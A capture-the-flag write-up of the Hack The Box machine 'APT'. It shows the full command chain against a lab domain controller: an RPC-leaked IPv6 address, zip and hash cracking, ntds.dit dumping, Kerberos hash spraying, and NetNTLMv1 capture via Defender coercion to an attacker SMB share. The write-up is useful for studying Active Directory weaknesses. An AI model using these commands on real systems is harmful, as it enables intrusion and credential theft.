---
layout: post
title: "The Address Written in Memory"
subtitle: "HTB APT, where a hidden IPv6 address leaks out of RPC, a backup zip hands you the whole forest, and a machine account speaks a 1990s dialect that cracks in minutes"
date: 2021-04-17 12:00:00 +0000
description: "An Insane Windows DC that shows you only two ports, then leaks its real address, its old backups, and a machine account that still answers in DES."
image: /assets/og/the-address-written-in-memory.png
tags: [hackthebox, writeup]
---

APT shows you almost nothing. Two ports answer on the front of the house, a web server and a bare RPC endpoint, and a casual scan walks away convinced there is no box here at all. But RPC is a chatterbox, and if you ask it the right dull question it volunteers the machine's other address, the one nobody advertised, hanging off in IPv6 space. Follow that address and a whole domain controller blooms into view, ports you never saw, including a file share with the company's old life zipped up inside it. Crack the zip and you are holding a backup of the entire directory, two thousand accounts and their hashes, frozen from some earlier day. The trick is not breaking in. The trick is realizing one of those old keys still turns a live lock, then noticing that the machine itself, the domain controller, still answers strangers in a dialect from the nineties that cracks in the time it takes to get coffee.

```
        A P T
        =====
        ipv4:   80  135   "nothing to see here"
                  \
        rpc, IOXIDResolver:  "oh, my other address?
                              dead:beef::...573f"
                  |
                  v
        ipv6 opens the real door: a domain controller,
        a backup.zip with two thousand old keys inside.

        one key still fits. and the machine itself
        still whispers in DES.
                                            址
```

## 0x01 · the empty street

The first scan is a shrug. IPv4 gives up two ports and a flat silence everywhere else.

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Microsoft IIS 10.0
135/tcp open  msrpc    Microsoft Windows RPC
```

A web server with nothing interesting on it, and RPC. No SMB, no LDAP, no Kerberos. For a box named after nation-state attackers, the doormat is suspiciously bare. That emptiness is the first clue. A real Windows domain controller is loud. It throws open a dozen ports without thinking. A DC showing you only port 135 is a DC hiding the rest of itself somewhere you have not looked yet.

## 0x02 · the address it let slip

RPC is the part of Windows that lets programs on different machines call each other's functions. One of its housekeeping interfaces, the OXID resolver, exists to answer a simple question. When a remote object lives on this host, which network addresses can reach it. You can ask that question with no credentials at all. And on a machine with more than one address, it answers with all of them.

Think of it like calling a company's front desk, where the receptionist is trained never to give out the building. But you ask "which entrances does the delivery dock use," and without thinking she reads you every door in the place, including the unmarked one around the back. The OXID resolver is that receptionist. It is not supposed to be a map. It becomes one the moment you ask about plumbing.

Point an IOXIDResolver script at port 135 and the box hands over its hidden half.

```
# python3 IOXIDResolver.py -t 10.10.10.213
[*] Retrieving network interface of 10.10.10.213
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
```

That second line is the whole game. An IPv6 address nobody told you about. Scan it directly, and the domain controller you suspected was hiding finally stands up.

```
# nmap -6 -p- dead:beef::b885:d62a:d679:573f
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
5985/tcp  open  wsman
...
```

There it is. DNS, Kerberos, LDAP, SMB, WinRM. The full forest, served only over the address the front desk leaked. IPv4 was the costume. IPv6 was the body.

## 0x03 · the backup that remembered everything

Over IPv6, SMB lets you list shares anonymously, and one of them is named `backup`. Inside sits a single file, `backup.zip`, about ten megabytes of someone's old diligence. Pull it down. It is password protected, which is a speed bump, not a wall. `zip2john` turns the archive into a hash and the wordlist does the rest.

```
# zip2john backup.zip > ziphash
# hashcat -m 17220 ziphash rockyou.txt
...:iloveyousomuch
```

The password is a love note, `iloveyousomuch`, and inside the unzipped folder is the crown jewels of any Active Directory. A copy of `ntds.dit`, the database where the domain keeps every account, plus the registry hive holding the key that decrypts it. Point Impacket's `secretsdump` at the pair and it walks out with roughly two thousand usernames and their NTLM hashes.

```
# secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
Administrator:500:...:...:::
... (about 2000 accounts) ...
```

Picture finding a company's old employee badge printer in a storage closet, still loaded with the master template for everyone's keycard from years back. Most of those people quit. Most of those cards were revoked. But all you need is one card that was never deactivated, and you are holding two thousand of them.

## 0x04 · the one key still cut for the lock

Two thousand hashes from a backup are a graveyard. The live domain has moved on, accounts deleted, passwords rotated. So the job is to find the overlap, the accounts that exist in both the dead backup and the living directory. `kerbrute` does this cleanly. It asks Kerberos, account by account, "does this user exist," and the answer leaks before any password is checked.

```
# kerbrute userenum -d apt.htb --dc dead:beef::...573f users.txt
[+] VALID USERNAME:  administrator@apt.htb
[+] VALID USERNAME:  henry.vinson@apt.htb
[+] VALID USERNAME:  APT$@apt.htb
```

Out of two thousand names, three survive. Now you have a live username, `henry.vinson`, and roughly two thousand hashes to try against it, because you do not know which of the backup hashes belongs to this still-living account. That is hash spraying, and the obvious way to do it, hammering SMB, trips a brute-force ban almost instantly. The box is watching that door.

So you walk through Kerberos instead. A modified `pyKerbrute` tests NTLM hashes against a single username using Kerberos pre-authentication, which is quieter and unbanned. Picture a thief with a ring of two thousand keys and a guard watching the front lock. Try them all at the front and the guard tackles you. So you try them at the side door the guard forgot about, one smooth motion at a time, until one turns.

```
# python3 pyKerbrute.py apt.htb henry.vinson hashes.txt
[+] henry.vinson e53d87d42adaa3ca32bdb34a876cbffb  VALID
```

One hash out of two thousand fits. The backup remembered a key the domain never bothered to change.

## 0x05 · the password the registry kept

That hash gets you remote registry access but not a shell. Henry is not a member of anything fun. So you read his registry the way you would rifle a desk drawer, using Impacket's `reg.py` with the hash, and in his user hive sits a vendor-flavored key that has no business storing what it stores.

```
# reg.py apt.htb/henry.vinson@dead:beef::...573f -hashes :e53d... \
    query -keyName 'HKCU\SOFTWARE\GiganticHostingManagementSystem'
    UserName  REG_SZ  henry.vinson_adm
    PassWord  REG_SZ  G1#Ny5@2dvht
```

A username and a cleartext password, sitting in the registry like a sticky note under a keyboard. `henry.vinson_adm` is the admin-flavored twin of the account you already have, and unlike plain henry, this one is allowed to log in over WinRM. `evil-winrm` turns the pair into a real prompt.

```
# evil-winrm -i dead:beef::...573f -u henry.vinson_adm -p 'G1#Ny5@2dvht'
*Evil-WinRM* PS C:\> type C:\Users\henry.vinson_adm\Desktop\user.txt
████████████████████████████████
```

A program storing its own password in plaintext is a program writing the answer key on the wall. The registry was supposed to hold settings. It held the keys to the next floor up.

## 0x06 · the machine still speaks DES

Now the hard part, and the reason this box wears the Insane label. `henry.vinson_adm` is not an administrator, and there is no comfortable kernel exploit waiting. The tell is in his PowerShell history, where a previous admin left a fingerprint of a deliberate misconfiguration.

```
*Evil-WinRM* PS C:\> type ...\PSReadline\ConsoleHost_history.txt
... lmcompatibilitylevel ... 2 ...
```

That setting, `lmcompatibilitylevel = 2`, tells the machine it is allowed to authenticate using NetNTLMv1, an ancient challenge-response scheme built on DES. And DES is broken in a very specific, very total way. Its key is so short that someone has precomputed the answer to every possible challenge, but only for one fixed challenge value, `1122334455667788`. If you can make the domain controller authenticate to you as the SYSTEM machine account, and you answer with that exact challenge, the response it sends back can be reversed into the machine's password almost instantly.

Think of it like a lock whose entire range of keys fits in one printed book, but only the lock that was set to a specific factory code. Set your fake lock to that code, make the victim try to open it, photograph the key shape they present, and flip to that page in the book. No filing, no brute force. Just a lookup.

So you stand up a listener primed with the magic challenge, then force the machine to come knock on it. Windows Defender is the perfect unwitting courier. Tell it to scan a file sitting on your SMB share and the scan engine authenticates outbound as the SYSTEM account, `APT$`.

```
# responder -I tun0 --lm   (challenge fixed to 1122334455667788)

*Evil-WinRM* PS C:\> & 'C:\Program Files\Windows Defender\MpCmdRun.exe' `
    -Scan -ScanType 3 -File \\10.10.14.4\iceberg\trip.txt

[SMB] NTLMv1 Client   : APT$
APT$::HTB:95aca8c7248774cb...:95aca8c7248774cb...:1122334455667788
```

That captured response is a NetNTLMv1 hash for the domain controller's own machine account. Feed it to crack.sh, the service that holds the rainbow tables for exactly this challenge, and the plaintext machine-account secret comes back in minutes. With the machine account, you are effectively the domain itself. One more `secretsdump`, this time against the live directory, drops every hash in the building, Administrator included.

```
# secretsdump.py 'apt.htb/APT$@dead:beef::...573f' -hashes :<cracked>
Administrator:500:...:c370bddf384a691d811ff3495e8a72e2:::
```

Pass that hash to WinRM and the last door opens.

```
# evil-winrm -i dead:beef::...573f -u administrator -H c370bddf384a691d811ff3495e8a72e2
*Evil-WinRM* PS C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x07 · the honest caveat

It is tempting to read APT as a parade of obscure tricks, the IPv6 leak, the modified spraying script, the DES lookup, and to file it under "too exotic to matter." That misreads it. Every single step is a place where something old was allowed to keep living next to something new, and the seam between them is the whole box.

The OXID leak is not a bug so much as a default that nobody questioned. The receptionist was always going to read you the back door, because that is her job, and IPv6 was sitting there unmonitored while everyone watched the IPv4 front. The backup zip is the universal sin, a snapshot of secrets kept long after the secrets should have rotated, protected by a password from a greeting card. And the NetNTLMv1 finale is the cleanest lesson of all. Nobody ran an exploit against the machine. The machine simply still knew how to speak a thirty-year-old protocol, and a single registry value gave it permission to. DES did not get weaker over the years. Computers got faster, somebody printed the whole keyspace into a book, and the protocol never noticed the world had moved.

That is the thread. Old keys in a backup, an old address nobody watched, an old protocol nobody turned off. None of it was unpatched in the usual sense. All of it was simply still there, answering, because turning a thing off is harder than leaving it on, and attackers live in the gap between those two.

## 0x08 · outro

```
the front desk read you the door it was told to hide.
the closet held two thousand keys, and one still turned.
the registry kept a password where a sticky note would go.
and the machine, asked nicely, answered in a dead language
        you already had the dictionary for.

nothing here was forced. it was all just left running,
one era too long, answering anyone who knew the old words.

watch the second address. rotate the old keys. wear black.

                                                            EOF
```

---

*HTB: APT, retired 10 Apr 2021. An insane Windows domain controller that is really a lecture on legacy left switched on, from an IPv6 address nobody watched to a machine account still fluent in DES. The old words still work in a lab and nowhere you don't own.*